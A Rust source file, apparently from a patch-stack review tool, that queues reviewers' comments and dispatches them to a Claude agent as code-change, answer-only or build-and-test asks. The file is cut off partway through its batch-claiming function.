//! Asking claude, which is sending it comments. The user's worktree is never
//! touched.
//!
//! A comment is written first, then sent, in one of three ways (`Way`):
//! claude may change the code, answer only, or build and test. Where the
//! comment is sets what claude may change (`Scope`): a comment on the stack,
//! the whole stack; a comment on a patch or on one of its lines, only that
//! patch, unless it is sent to the whole stack. Comments sent together go
//! in one ask.
//!
//! A sent comment waits as ready, and goes as soon as nothing stands in its
//! way, as in self-review: one changing ask at a time on a stack, answer-only
//! asks together, a build and test once no change is running on its stack,
//! one at a time of every stack, as builds take the machine. `launch` starts
//! what can go; it runs when a comment is sent and when an
//! ask lands, so what waits goes on its own. A comment may be batched
//! instead, as in self-review too: it waits for you to send the batch, and
//! then goes with the rest asked the same way, in one ask (the changes, and
//! the answers unless they fan out, an ask each).
//!
//! A change works in a git worktree of the stack's own, `.stacked/NAME/agent`
//! (`agent-2`… when it is busy, or holds what an agent left unfinished),
//! made the first time and taken again by the next, or made ahead by the
//! editor; or, as the settings say, in the user's checkout moved to the
//! stack and back. For the stack, all its patches as commits; for a patch,
//! the stack up to it: the patches below as commits and the patch on top,
//! the patches above to read only. A patch change
//! checks, with `stacked fits`, that the patches above still apply on it; if
//! they would not, claude changes nothing and the comment is promoted to the
//! stack. An answer runs in the repository as it is checked out, as
//! self-review's do (unless the settings give it a worktree of the stack's
//! own, `.stacked/NAME/answer-only-agent`): a worktree of a big repository
//! takes long to make. It
//! reads the stack through stacked (`export`, `show`, and a file as a patch
//! leaves it, `show --path`), and is let run nothing that changes anything.
//! A build and test works in a worktree of the stack's own too,
//! `.stacked/NAME/build`, the stack up to its place applied: kept for the
//! next build to build on, what a build made there left as it is.
//!
//! When claude exits, `stacked land` files what it did: a patch change slots
//! into the stack as it is by then, the comments on lines a split moved
//! following them; replies land as turns of their threads; an answer may open
//! comments of its own within the scope, as a review does. Everything is in
//! the database: the run as it starts, each line claude writes, and what came
//! of it.

use std::collections::{HashMap, HashSet};
use std::io::BufRead;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

use serde::{Deserialize, Serialize};
use serde_json::{Map, Value};

use crate::claude::{allowed_tools, format_event, last_object, parse_claude_replies, parse_review_notes};
use crate::config::Workspace;
use crate::db::{
    Db, Effort, Error, Moved, Note, Patch, Queued, Record, Result, Run, RunState, Stack, Stage, Way,
    err, now, stack_change,
};
use crate::git;
use crate::held::Held;
use crate::mbox::{format_mbox, parse_mbox};
use crate::ops::{base_of, plan_drafts};
use crate::thread::{Role, append_turn, fenced, last_reply_way, last_role, thread_turns};
use crate::view::{MSG_PATH, find_line, mode, note_lines, title_key};

/// What an ask may change: the whole stack, or the patch of this change.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Scope {
    Stack,
    Patch(String),
}

/// The scope a comment is in.
pub fn scope_of(n: &Note) -> Scope {
    if n.on_stack() {
        Scope::Stack
    } else {
        Scope::Patch(n.change.clone())
    }
}

/// The scope an ask of `n` has: the one it is in, or the whole stack when
/// it was sent so.
fn asked_scope(n: &Note) -> Scope {
    match &n.queued {
        Some(q) if q.stack => Scope::Stack,
        _ => scope_of(n),
    }
}

/// The scope run `id` was started with, if it is an ask.
pub fn run_scope(db: &Db, id: &str) -> Option<Scope> {
    light(db.run(id)?).map(|l| l.scope)
}

/// A comment claude is shown, by the label the prompt gives it.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Shown {
    pub label: String,
    pub change: String,
    pub id: String,
}

/// All an ask is started with, kept in its run.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Info {
    pub way: Way,
    pub scope: Scope,
    /// The stack the ask started from.
    pub from: usize,
    pub notes: Vec<Shown>,
    #[serde(default)]
    pub base: String,
    #[serde(default)]
    pub repo: String,
    /// The worktree it works in.
    #[serde(default)]
    pub worktree: Option<String>,
    /// Its worktree is one of the stack's own, kept once it lands for the
    /// next ask to take, while it holds nothing an agent left unfinished.
    #[serde(default)]
    pub kept: bool,
    /// The user's checkout it works in, moved to the stack: where it was,
    /// to go back to once it lands, and the files git did not track then.
    #[serde(default)]
    pub back: Option<git::Head>,
    #[serde(default)]
    pub untracked: Vec<String>,
    /// For a patch: its id when the ask started, and where it was.
    #[serde(default)]
    pub patch: Option<(String, usize)>,
    /// Each commit made in the worktree, bottom first, and the patch it is.
    #[serde(default)]
    pub commits: Vec<(String, String)>,
    #[serde(default)]
    pub prompt: String,
    /// A round sent back from the review of landed work: that work's run,
    /// whose stack it starts from rather than the stack at `from`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub on: Option<String>,
    /// A guess: the landed work, by its run, whose change waits for your
    /// review and which it goes on from, as if you accept it. Accepted, it
    /// guessed right and goes on from the stack as any ask; rejected, sent
    /// back or edited by hand, it is dropped and starts again.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub after: Option<String>,
    /// The batch it was sent in, where it goes back in the queue if dropped.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub batch: String,
    /// Dropped, its guess wrong: its worktree is free to be taken again.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub dropped: bool,
    /// Asked again: the run before it, whose landed work was dropped, shown
    /// to the agent to reuse what still holds.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub was: Option<String>,
    /// A change to the whole stack: the folder its agent writes its rebase
    /// plan in, removed once it lands.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub todo: Option<String>,
    /// The effort the agent is asked at (`--effort`), the one its comments
    /// were queued at; none for an ask made before efforts were picked,
    /// which goes at the agent's own.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub effort: Option<Effort>,
}

/// The stack ask `i` works on: the stack at `i.from`; or, a round sent
/// back from the review of landed work, or a guess going on from landed
/// work that waits for review, the stack that work makes.
fn started_from(db: &Db, i: &Info) -> Result<Stack> {
    let s = db.node(i.from)?.clone();
    let Some(c) = i.on.as_deref().or(i.after.as_deref()).and_then(|on| db.run(on)?.held.as_ref()?.stack.clone()) else {
        return Ok(s);
    };
    Ok(Stack {
        patches: c.patches,
        base: c.base.or(s.base.clone()),
        ..s
    })
}

pub fn info(r: &Run) -> Option<Info> {
    serde_json::from_value(r.ask.clone()?).ok()
}

/// What deciding what goes needs of an ask: read from its run without the
/// rest (its prompt, its commits), as it is read on every redraw.
#[derive(Debug, Clone, Deserialize)]
struct Light {
    way: Way,
    scope: Scope,
    notes: Vec<Shown>,
}

fn light(r: &Run) -> Option<Light> {
    Light::deserialize(r.ask.as_ref()?).ok()
}

/// Whether claude may be sent `n`: the last word is yours or a reviewer's,
/// or claude's why it moved the comment to the stack, where it waits to be
/// sent again.
pub fn sendable(n: &Note) -> bool {
    n.queued.is_none()
        && match last_role(&n.text) {
            Some(Role::Agent) => last_reply_way(&n.text).as_deref() == Some("moved"),
            Some(_) => true,
            None => false,
        }
}

/// Whether `n` may be sent to build and test: a comment on the stack, or on
/// a patch as a whole (its title), not on a line.
pub fn can_test(db: &Db, n: &Note) -> bool {
    n.on_stack()
        || (n.file == MSG_PATH
            && db.latest_version(&n.change).is_some_and(|p| title_key(p) == n.line))
}

/// Is run `r` still going: started, and its process there, or about to be?
pub fn busy(r: &Run) -> bool {
    r.state == RunState::Started && r.pid.is_none_or(alive)
}

pub fn alive(pid: u32) -> bool {
    unsafe { libc::kill(pid as i32, 0) == 0 }
}

/// What leaving the editor says of the asks still running: a line for
/// each, as `stacked runs` says it, and where its agent works: its
/// worktree, or the repository as it is checked out.
pub fn still_running(db: &Db) -> Vec<String> {
    db.live_runs()
        .iter()
        .filter(|r| running(r))
        .map(|r| {
            let words = r.request.split_whitespace().collect::<Vec<_>>().join(" ");
            let asked = match words.chars().count() {
                0 => String::new(),
                n if n > 60 => format!(" \"{}…\"", words.chars().take(59).collect::<String>()),
                _ => format!(" \"{words}\""),
            };
            let at = match info(r) {
                Some(Info { worktree: Some(w), .. }) => format!("works in {w}"),
                Some(i) if r.pid.is_some() && !i.repo.is_empty() => format!("works in {}", i.repo),
                _ => "is being started, its worktree being made".to_string(),
            };
            format!("{} {} {}{asked} {at}", r.id, r.what, r.stack)
        })
        .collect()
}

/// Is run `r` running: started, and its process there.
pub fn running(r: &Run) -> bool {
    r.state == RunState::Started
        && match r.pid {
            Some(pid) => alive(pid),
            // Being started: its worktree made.
            None => r.starter.is_some_and(alive),
        }
}

/// The asks of stack `name` still going, with what each was started with.
fn asks_going<'a>(db: &'a Db, name: &str) -> Vec<(&'a Run, Light)> {
    db.live_runs()
        .into_iter()
        .filter(|r| r.stack == name && busy(r))
        .filter_map(|r| Some((r, light(r)?)))
        .collect()
}

/// The comments the agent is working on, to how it was sent them and the
/// run.
pub fn with_agent(db: &Db) -> HashMap<(String, String), (Way, String)> {
    let mut out = HashMap::new();
    for r in db.live_runs().into_iter().filter(|r| busy(r)) {
        if let Some(i) = light(r) {
            for n in &i.notes {
                out.insert((n.change.clone(), n.id.clone()), (i.way, r.id.clone()));
            }
        }
    }
    out
}

/// What a comment sent on stack `name` in `way` would wait on, if anything.
pub fn waits_on(db: &Db, name: &str, way: Way) -> Option<String> {
    let going = asks_going(db, name);
    let chain = chains(&agent_of(db, name));
    // Chained, an answer runs alongside a change, on the stack as it is.
    let change = going.iter().find(|(_, i)| i.way == Way::Change).filter(|_| !(chain && way == Way::Answer));
    if let Some((_, i)) = change {
        let on = match &i.scope {
            Scope::Stack => "the stack".to_string(),
            Scope::Patch(c) => format!("patch {}", position(db, name, c).map_or("?".into(), |p| (p + 1).to_string())),
        };
        return Some(format!("once the agent's change on {on} lands"));
    }
    // A change goes from the stack as it is once the change before it is
    // reviewed; chained, at once, from the stack that change makes.
    if way == Way::Change
        && !chain
        && let Some(r) = crate::held::change_waiting(db, name)
        && let Some(c) = r.held.as_ref().and_then(|h| h.stack.as_ref())
    {
        return Some(format!("once you have reviewed {} of {}", whose_change(r), c.of));
    }
    match way {
        Way::Change if !chain && going.iter().any(|(_, i)| i.way == Way::Answer) => {
            Some("once the running answers land".into())
        }
        // One build and test at a time, of every stack.
        Way::Test => testing(db).map(|r| match r.stack == name {
            true => "once the running build and test lands".to_string(),
            false => format!("once the running build and test of {} lands", r.stack),
        }),
        _ => None,
    }
}

/// The agent's settings for stack `name`: its repository's checkout's, as
/// an ask of it starts with.
fn agent_of(db: &Db, name: &str) -> crate::config::Agent {
    let dir = db.stack(name).ok().and_then(|s| s.repo.clone()).map_or_else(|| PathBuf::from("."), PathBuf::from);
    crate::config::of(&dir).0.agent
}

/// Why stack `name` cannot be asked anything yet, if it cannot: what each
/// kind of ask may use is not set up in the settings of its checkout
/// (`agent.setup`, global or the checkout's own), or was set up by an
/// earlier version of the setup than this stacked's. A stack kept in
/// memory, the tour's, is answered by a stand-in, with nothing to set up.
pub fn not_set_up(db: &Db, name: &str) -> Option<String> {
    #[cfg(feature = "demo")]
    if db.stack(name).ok().and_then(|s| s.repo.as_deref()).is_some_and(|r| crate::memory::is_repo(Path::new(r))) {
        return None;
    }
    let run = format!("run `stacked setup agent {name}` first");
    match agent_of(db, name).setup.unwrap_or(0) {
        n if n >= crate::setup::VERSION => None,
        0 => Some(format!("the tools each kind of ask may use are not set up yet: {run}, to check them and save them; nothing was sent")),
        _ => Some(format!("the tools each kind of ask may use were set up by an earlier stacked: {run}, to check them again and save them; nothing was sent")),
    }
}

/// As `not_set_up`, an error.
fn set_up(db: &Db, name: &str) -> Result<()> {
    match not_set_up(db, name) {
        Some(why) => err(why),
        None => Ok(()),
    }
}

/// Whether, with `agent`'s settings, a change or an answer goes on from the
/// change waiting for your review, guessing you accept it: unless the
/// setting says not, or changes work in your checkout, one at a time.
fn chains(agent: &crate::config::Agent) -> bool {
    agent.chain && agent.worktree != Workspace::Pwd
}

/// Whether stack `name`'s agent makes its changes in your checkout, moved
/// to the stack and back (`agent.worktree = "pwd"`).
pub fn changes_in_checkout(db: &Db, name: &str) -> bool {
    agent_of(db, name).worktree == Workspace::Pwd
}

/// What the next change or answer of stack `name` goes on from, chained:
/// the last landed work whose change of the stack waits for your review.
fn guessed_from(db: &Db, name: &str) -> Option<String> {
    crate::held::queue(db, name).into_iter().rev().find(|r| r.held.as_ref().is_some_and(|h| h.stack.is_some())).map(|r| r.id.clone())
}

/// The work run `r` goes on from, guessing you accept it, while that work
/// waits for your review: it is reviewed first.
pub fn guessing(db: &Db, r: &Run) -> Option<String> {
    info(r)?.after.filter(|a| db.run(a).is_some_and(|w| crate::held::waiting(db, w)))
}

/// The runs going on from landed work `id`, guessing it is accepted, that
/// still work or wait for your review.
fn guesses_on(db: &Db, id: &str) -> Vec<Run> {
    db.live_runs()
        .into_iter()
        .filter(|r| info(r).is_some_and(|i| i.after.as_deref() == Some(id) && !i.dropped))
        .filter(|r| r.state == RunState::Started || crate::held::waiting(db, r))
        .cloned()
        .collect()
}

/// Landed work `id` accepted, its change now the stack at `rev`: what went
/// on from it guessed right, and goes on from that stack as any ask does.
pub fn guessed_right(db: &mut Db, id: &str, rev: usize) -> Result<()> {
    for r in guesses_on(db, id) {
        let Some(mut i) = info(&r) else { continue };
        (i.from, i.after) = (rev, None);
        db.add_run(Run {
            ask: Some(serde_json::to_value(&i).unwrap()),
            ..r
        })?;
    }
    Ok(())
}

/// Run `r`, of ask `i`, dropped (`why`): its agent stopped if it still
/// works, what it brought back thrown away unseen, its comments back in the
/// queue as they were sent, to be asked again.
fn drop_run(db: &mut Db, r: &Run, mut i: Info, why: String) -> Result<()> {
    i.dropped = true;
    let running = r.state == RunState::Started;
    db.add_run(Run {
        state: if running { RunState::Failed } else { r.state },
        summary: why,
        ask: Some(serde_json::to_value(&i).unwrap()),
        ..r.clone()
    })?;
    if running {
        stop(r);
    } else {
        let v = db.review(&r.id).cloned().unwrap_or_default();
        db.set_review(&r.id, crate::held::Review { closed: true, ..v })?;
    }
    // Landed, what it brought back is shown to the agent asked again.
    let landed = (!running && r.held.is_some()).then(|| r.id.clone());
    ask_again(db, &i, landed)
}

/// Landed work `id` rejected, sent back or edited by hand (`why`): what
/// went on from it guessed wrong. Each is dropped, and asked again; and so
/// with what went on from it. How many.
pub fn guessed_wrong(db: &mut Db, id: &str, why: &str) -> Result<usize> {
    let mut n = 0;
    for r in guesses_on(db, id) {
        let Some(i) = info(&r) else { continue };
        drop_run(db, &r, i, format!("dropped: the work it went on from was {why}; asked again"))?;
        n += 1 + guessed_wrong(db, &r.id, "dropped")?;
    }
    Ok(n)
}

/// What rejecting landed work `id`, or sending it back, drops: what went on
/// from it, and from that; still working, and waiting for your review.
pub fn guesses_after(db: &Db, id: &str) -> (usize, usize) {
    let mut out = (0, 0);
    for r in guesses_on(db, id) {
        let (running, waiting) = guesses_after(db, &r.id);
        let own = usize::from(r.state == RunState::Started);
        out = (out.0 + own + running, out.1 + (1 - own) + waiting);
    }
    out
}

/// The answer-only asks of stack `name`, but run `but`, still running or
/// waiting for your review: made on the stack as it was.
fn answers_in_flight(db: &Db, name: &str, but: &str) -> Vec<Run> {
    db.live_runs()
        .into_iter()
        .filter(|r| r.stack == name && r.id != but && info(r).is_some_and(|i| i.way == Way::Answer && !i.dropped))
        .filter(|r| r.state == RunState::Started || crate::held::waiting(db, r))
        .cloned()
        .collect()
}

/// A change of stack `name` accepted, in the review of run `id`: chained,
/// the answer-only asks made on the stack before it, running or waiting for
/// your review, are dropped and asked again, on the stack as it is now. How
/// many.
pub fn reask_answers(db: &mut Db, name: &str, id: &str) -> Result<usize> {
    if !chains(&agent_of(db, name)) {
        return Ok(0);
    }
    let runs = answers_in_flight(db, name, id);
    for r in &runs {
        let Some(i) = info(r) else { continue };
        drop_run(db, r, i, "dropped: an edit of the stack was accepted meanwhile; asked again".into())?;
    }
    Ok(runs.len())
}

/// What accepting a change of stack `name`, in the review of run `id`, asks
/// again, chained: the answer-only asks running, and waiting for your
/// review.
pub fn answers_reasked(db: &Db, name: &str, id: &str) -> (usize, usize) {
    if !chains(&agent_of(db, name)) {
        return (0, 0);
    }
    let runs = answers_in_flight(db, name, id);
    let running = runs.iter().filter(|r| r.state == RunState::Started).count();
    (running, runs.len() - running)
}

/// The builds and tests of stack `name` going: of the stack as it is, which
/// accepting a change leaves behind. Not asked again; you may stop them.
pub fn builds_going(db: &Db, name: &str) -> Vec<Run> {
    db.live_runs()
        .into_iter()
        .filter(|r| r.stack == name && busy(r) && info(r).is_some_and(|i| i.way == Way::Test))
        .cloned()
        .collect()
}

/// The comments ask `i` was about back in the queue, ready, in the batch
/// they were sent in: they go again as they were asked, at the effort they
/// were asked at, the agent shown what run `was` brought back, if it
/// landed.
fn ask_again(db: &mut Db, i: &Info, was: Option<String>) -> Result<()> {
    let batch = if i.batch.is_empty() { format!("b{}", crate::db::unique()) } else { i.batch.clone() };
    for sh in &i.notes {
        let Some(n) = db.note(&sh.change, &sh.id).cloned() else { continue };
        let stack = i.scope == Scope::Stack && !n.on_stack();
        db.set_note(Note {
            queued: Some(Queued {
                way: i.way,
                batch: batch.clone(),
                stack,
                stage: Stage::Ready,
                on: i.on.clone(),
                was: was.clone(),
                effort: i.effort,
            }),
            failed: None,
            ..n
        })?;
    }
    Ok(())
}

/// The stack landed work run `id` makes: its change of the stack on the
/// stack it is of, whether it still waits for review or not.
pub fn work_stack(db: &Db, id: &str) -> Result<Stack> {
    let r = db.run(id).ok_or_else(|| Error(format!("no run {id}")))?;
    let c = r.held.as_ref().and_then(|h| h.stack.clone()).ok_or_else(|| Error(format!("run {id} holds no change of the stack")))?;
    let s = db.stack(&r.stack)?.clone();
    Ok(Stack {
        patches: c.patches,
        base: c.base.or(s.base.clone()),
        ..s
    })
}

/// What goes on a stack as `claim` starts batches.
struct Going {
    /// A change is going; and how many answers.
    change: bool,
    answers: usize,
    /// A change waits for what is going, before the answers behind it.
    change_waits: bool,
    /// A change waits for your review.
    reviewing: bool,
    /// Changes go on from the change under review, guessing; answers run
    /// alongside them, on the stack as it is.
    chain: bool,
    /// The work under review they go on from: the last landed.
    tail: Option<String>,
}

/// The build and test in flight, of whichever stack: one at a time, as
/// builds take the machine.
fn testing(db: &Db) -> Option<&Run> {
    db.live_runs().into_iter().find(|r| busy(r) && light(r).is_some_and(|i| i.way == Way::Test))
}

/// Why stack `name` cannot be edited by hand now, if it cannot: the agent
/// is changing it, from the stack as it took it, or is about to go on from
/// work you sent back, from the stack as that work left it; so nothing else
/// may change the stack meanwhile.
pub fn blocked(db: &Db, name: &str) -> Option<String> {
    if let Some((_, i)) = asks_going(db, name).into_iter().find(|(_, i)| i.way == Way::Change) {
        let on = match &i.scope {
            Scope::Stack => "the stack".to_string(),
            Scope::Patch(c) => format!("patch {}", position(db, name, c).map_or("?".into(), |p| (p + 1).to_string())),
        };
        return Some(format!(
            "the agent is changing {on}: the stack can be edited by hand again once you have reviewed the agent's work"
        ));
    }
    if round_waiting(db, name) {
        return Some(
            "the work you sent back waits to go back to the agent: the stack can be edited by hand again once you have reviewed the agent's new work"
                .into(),
        );
    }
    let r = crate::held::change_waiting(db, name)?;
    let of = r.held.as_ref()?.stack.as_ref()?.of.clone();
    Some(format!(
        "{} of {of} waits for your review: the stack can be edited by hand again once you have reviewed it",
        whose_change(r)
    ))
}

/// Whether a round sent back from the review of stack `name`'s landed work,
/// one that may change the code, waits its turn.
fn round_waiting(db: &Db, name: &str) -> bool {
    db.stack_notes(name).iter().any(|n| n.queued.as_ref().is_some_and(|q| q.on.is_some() && q.way == Way::Change && !q.batched()))
}

/// Whose change of the stack run `r` holds, said: `your edit by hand`,
/// `the agent's change`.
pub fn whose_change(r: &Run) -> &'static str {
    if crate::held::by_hand(r) { "your edit by hand" } else { "the agent's change" }
}

/// Where the patch of `change` is in stack `name`, from 0.
fn position(db: &Db, name: &str, change: &str) -> Option<usize> {
    db.stack(name)
        .ok()?
        .patches
        .iter()
        .position(|id| db.patch(id).change == change)
}

/// Sends `notes` (change, id) of stack `name` to the agent, in `way`, to
/// the whole stack if `whole`, at `effort`: they wait as ready, together,
/// and go as soon as nothing stands in their way. What they wait on, if
/// they could not go at once.
pub fn send(db_path: &Path, name: &str, notes: &[(String, String)], way: Way, whole: bool, effort: Effort) -> Result<Option<String>> {
    queue(db_path, name, notes, way, whole, effort)?;
    launch(db_path)?;
    let db = Db::load(db_path)?;
    let waiting = notes
        .iter()
        .any(|(c, i)| db.note(c, i).and_then(|n| n.queued.as_ref()).is_some_and(|q| !q.batched()));
    Ok(if waiting {
        Some(waits_on(&db, name, way).unwrap_or_else(|| "its turn".into()))
    } else {
        None
    })
}

/// Puts `notes` of stack `name` on the agent's queue, in `way`, together,
/// at `effort`: `launch` starts them when nothing stands in their way, at
/// that effort whenever that is. The editor launches elsewhere than where
/// it draws: making a worktree takes time. With `whole`, a patch's
/// comments are sent to the whole stack: the agent may change any patch,
/// add patches anywhere, reorder them.
pub fn queue(db_path: &Path, name: &str, notes: &[(String, String)], way: Way, whole: bool, effort: Effort) -> Result<()> {
    if notes.is_empty() {
        return err("no comment to send");
    }
    check_ahead(db_path, name);
    Db::edit(db_path, |db| {
        set_up(db, name)?;
        applies(db, name)?;
        enqueue(db, notes, way, whole, Stage::Ready, None, Some(effort))
    })
}

/// Sends the work run `id` holds back to the agent, as what you wrote in
/// its review asks (`held::send_back`): another round, from that work's
/// stack, whose own work lands to review in its place; at `effort`, else
/// at the effort the work was asked at. What was sent, said. `launch`
/// starts it.
pub fn send_back(db_path: &Path, name: &str, id: &str, marks: &std::collections::BTreeMap<String, bool>, effort: Option<Effort>) -> Result<String> {
    check_ahead(db_path, name);
    Db::edit(db_path, |db| {
        set_up(db, name)?;
        applies(db, name)?;
        let round = crate::held::send_back(db, id, marks)?;
        enqueue(db, &round.notes, round.way, round.whole, Stage::Ready, Some(id), effort.or(round.effort))?;
        let n = round.notes.len();
        let said = if round.whole && round.way == Way::Change { crate::db::WHOLE } else { round.way.said() };
        let mut out = format!("sent back to the agent ({said}): {n} comment{} to ask again", if n == 1 { "" } else { "s" });
        match round.dropped {
            0 => {}
            1 => out += "; 1 edit that went on from it asked again",
            k => out += &format!("; {k} edits that went on from it asked again"),
        }
        Ok(out)
    })
}

/// Whether stack `name` applies, checked with no lock held (it takes a
/// moment on a big repository): under it, the check is remembered.
fn check_ahead(db_path: &Path, name: &str) {
    if let Ok(db) = Db::load(db_path)
        && let Ok(s) = db.stack(name)
    {
        let _ = db.verify(s);
    }
}

/// Claude works on the stack as it applies: one that does not, or cannot
/// be checked, cannot be sent anything.
fn applies(db: &Db, name: &str) -> Result<()> {
    let s = db.stack(name)?.clone();
    db.verify(&s)
        .map_err(|e| Error(format!("cannot send: {}", e.0.trim_end_matches("; nothing changed"))))
}

/// Under the lock: `notes` on the agent's queue, at `stage`, in `way`,
/// together, in a batch of their own, to be asked at `effort`; from the
/// stack of landed work `on`, if a round sent back from it.
fn enqueue(db: &mut Db, notes: &[(String, String)], way: Way, whole: bool, stage: Stage, on: Option<&str>, effort: Option<Effort>) -> Result<()> {
    if notes.is_empty() {
        return err("no comment to send");
    }
    if whole && way == Way::Test {
        return err("a build and test is not asked of the whole stack");
    }
    let batch = format!("b{}", crate::db::unique());
    let busy = with_agent(db);
    let mut scope = None;
    for (change, id) in notes {
        let Some(n) = db.note(change, id).cloned() else {
            return err("no such comment");
        };
        if busy.contains_key(&(change.clone(), id.clone())) {
            return err("the agent is already working on it");
        }
        let broken = crate::refs::broken_in(&n);
        if !broken.is_empty() {
            return err(format!(
                "{} names no reference attached to the comment: attach one, or write it otherwise, before the agent is asked",
                broken.join(", ")
            ));
        }
        if crate::held::reply_waiting(db, change, id).is_some() {
            return err("the agent's reply to it waits for your review: review it first");
        }
        if way == Way::Test && !can_test(db, &n) {
            return err("only a comment on the stack or on a patch as a whole can be sent to build and test");
        }
        if way != Way::Answer && n.about.is_some() {
            return err("a comment on the history is asked about to answer only: it changes nothing");
        }
        let reach = if whole { Scope::Stack } else { scope_of(&n) };
        match &scope {
            None => scope = Some(reach),
            Some(s) if *s != reach => return err("comments sent together must be on one patch, or all on the stack"),
            _ => {}
        }
        db.set_note(Note {
            queued: Some(Queued {
                way,
                batch: batch.clone(),
                stack: whole && !n.on_stack(),
                stage,
                on: on.map(String::from),
                was: None,
                effort,
            }),
            failed: None,
            ..n
        })?;
    }
    Ok(())
}

/// Puts `notes` of stack `name` in its batch, to be asked later in `way`
/// (to the whole stack if `whole`), at `effort`: each waits there until
/// you send the batch. Nothing is started.
pub fn batch(db_path: &Path, name: &str, notes: &[(String, String)], way: Way, whole: bool, effort: Effort) -> Result<()> {
    if notes.is_empty() {
        return err("no comment to batch");
    }
    Db::edit(db_path, |db| {
        for at in notes {
            // Sent with the stack's batch: one of its comments.
            if !db.stack_notes(name).iter().any(|n| (&n.change, &n.id) == (&at.0, &at.1)) {
                return err(format!("that comment is not on {name}"));
            }
            enqueue(db, std::slice::from_ref(at), way, whole, Stage::Batch, None, Some(effort))?;
        }
        Ok(())
    })
}

/// Stack `name`'s batched comments asked in `way`, in the order of the
/// stack's comments: each with whether it goes to the whole stack.
pub fn batched(db: &Db, name: &str, way: Way) -> Vec<((String, String), bool)> {
    db.stack_notes(name)
        .into_iter()
        .filter_map(|n| {
            let q = n.queued.as_ref().filter(|q| q.batched() && q.way == way)?;
            Some(((n.change.clone(), n.id.clone()), q.stack))
        })
        .collect()
}

/// The effort stack `name`'s batch of what is asked in `way` was asked at:
/// the highest its comments were batched at, if any was.
pub fn batched_effort(db: &Db, name: &str, way: Way) -> Option<Effort> {
    db.stack_notes(name)
        .into_iter()
        .filter_map(|n| n.queued.as_ref().filter(|q| q.batched() && q.way == way)?.effort)
        .max()
}

/// Sends stack `name`'s batch of what is asked in `way`: its comments turn
/// ready together, as one ask, or with `fan` (as builds and tests always
/// do) each as an ask of its own. Together, comments from more than one
/// place (the stack, or a patch) go to the whole stack, as do those
/// batched so. Each ask goes at `effort`; else at the effort its comments
/// were batched at, the highest of them for an ask of several. `launch`
/// starts them. How many were sent.
pub fn release_batch(db_path: &Path, name: &str, way: Way, fan: bool, effort: Option<Effort>) -> Result<usize> {
    check_ahead(db_path, name);
    Db::edit(db_path, |db| {
        let all = batched(db, name, way);
        if all.is_empty() {
            return Ok(0);
        }
        set_up(db, name)?;
        applies(db, name)?;
        let own = |db: &Db, (c, i): &(String, String)| db.note(c, i).and_then(|n| n.queued.as_ref()?.effort);
        if fan || way == Way::Test {
            for (at, whole) in &all {
                let at_effort = effort.or(own(db, at));
                enqueue(db, std::slice::from_ref(at), way, *whole, Stage::Ready, None, at_effort)?;
            }
        } else {
            let places: HashSet<Scope> = all.iter().filter_map(|((c, i), _)| db.note(c, i)).map(scope_of).collect();
            let whole = places.len() > 1 || all.iter().any(|(_, whole)| *whole);
            let notes: Vec<(String, String)> = all.iter().map(|(at, _)| at.clone()).collect();
            let at_effort = effort.or(batched_effort(db, name, way));
            enqueue(db, &notes, way, whole, Stage::Ready, None, at_effort)?;
        }
        Ok(all.len())
    })
}

/// Puts comment (change, id) back on the agent's queue as it was, `q`:
/// taken off while it was edited, and left as it was. Not if it is on the
/// queue again already, or with the agent.
pub fn requeue(db_path: &Path, change: &str, id: &str, q: Queued) -> Result<()> {
    Db::edit(db_path, |db| {
        let Some(n) = db.note(change, id).cloned() else { return Ok(()) };
        if n.queued.is_some() || with_agent(db).contains_key(&(change.to_string(), id.to_string())) {
            return Ok(());
        }
        db.set_note(Note { queued: Some(q), ..n })
    })
}

/// Takes `notes` off claude's queue, unsent.
pub fn unsend(db_path: &Path, notes: &[(String, String)]) -> Result<()> {
    Db::edit(db_path, |db| {
        for (c, i) in notes {
            if let Some(n) = db.note(c, i).cloned() {
                db.set_note(Note { queued: None, ..n })?;
            }
        }
        Ok(())
    })
}

/// Starts every ask that may go now; the runs started.
pub fn launch(db_path: &Path) -> Result<Vec<String>> {
    if !Db::exists(db_path) {
        return Ok(vec![]);
    }
    let claimed = Db::edit(db_path, claim)?;
    for id in &claimed {
        if let Err(e) = start(db_path, id) {
            fail_start(db_path, id, &e.0)?;
        }
    }
    Ok(claimed)
}

/// Under the lock: the ready batches that may go now, each a run begun,
/// its comments taken off the queue. Their run ids.
fn claim(db: &mut Db) -> Result<Vec<String>> {
    // The ready batches: stack, way, scope, comments, the landed work a
    // round sent back starts from, the run asked before it, and the effort
    // they were sent at (the highest, should they differ).
    let mut order: Vec<String> = Vec::new();
    type Batch = (String, Way, Scope, Vec<Note>, Option<String>, Option<String>, Option<Effort>);
    let mut batches: HashMap<String, Batch> = HashMap::new();
    for s in db.stacks() {
        for n in db.stack_notes(&s.name) {
            let Some(q) = n.queued.as_ref().filter(|q| !q.batched()) else { continue };
            let entry = batches.entry(q.batch.clone()).or_insert_with(|| {
                order.push(q.batch.clone());
                (s.name.clone(), q.way, asked_scope(n), Vec::new(), q.on.clone(), q.was.clone(), q.effort)
            });
            entry.3.push(n.clone());
            entry.6 = entry.6.max(q.effort);
        }
    }
    // A round sent back first, as it goes on from the work just reviewed,
    // the stack still that work's; then the rest, oldest first.
    order.sort_by(|a, b| (batches[a].4.is_none(), a).cmp(&(batches[b].4.is_none(), b)));
    let mut started = Vec::new();
    // Per stack: what is going, as the batches are started; whether a change
    // waits for its review; and, chained, what the next goes on from. Of
    // every stack: whether a build and test is going.
    let mut state: HashMap<String, Going> = HashMap::new();
    let mut test = testing(db).is_some();
    for b in &order {
        let (name, way, scope, notes, on, was, effort) = batches[b].clone();
        let st = state.entry(name.clone()).or_insert_with(|| {
            let going = asks_going(db, &name);
            Going {
                change: going.iter().any(|(_, i)| i.way == Way::Change),
                answers: going.iter().filter(|(_, i)| i.way == Way::Answer).count(),
                change_waits: false,
                reviewing: crate::held::change_waiting(db, &name).is_some(),
                chain: chains(&agent_of(db, &name)),
